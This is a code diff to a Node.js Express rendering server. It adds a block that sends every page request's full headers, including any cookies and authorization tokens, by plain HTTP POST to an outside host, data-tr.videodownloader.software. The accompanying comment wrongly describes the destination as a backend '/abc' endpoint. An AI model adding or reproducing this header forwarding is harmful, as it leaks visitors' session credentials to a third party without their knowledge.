@@ -2,6 +2,7 @@
 import fs from "node:fs/promises" // 导入文件系统模块，用于读取文件（使用 Promises）
 import os from "node:os" // 导入操作系统模块，用于获取环境变量
 
+import axios from "axios"
 import express from "express" // 导入 Express，用于创建 HTTP 服务器
 
 // 常量
@@ -63,6 +64,22 @@ app.use("*", async (req, res) => {
     const originHost = req.headers.host.split(":")[0] || "localhost"
     const host = originHost.replace(/^www\./, "")
     const url = req.originalUrl.replace(base, "") // 获取请求的 URL，并去除基础路径
+
+    // header 上报
+    if (!url.includes(".")) {
+      const data = {
+        dt: new Date().toISOString().split("T")[0], // 当前日期，格式为 YYYY-MM-DD
+        host: host,
+        path: url,
+        timestamp: Date.now(),
+        ...req.headers
+      }
+      // 异步地发送 POST 请求到后端的 /abc 接口
+      axios.post("http://data-tr.videodownloader.software/web/report", data).catch((error) => {
+        // 处理错误，但不影响后续的渲染
+        console.error("Error sending data to /abc:", error)
+      })
+    }
 
     let template
     let render
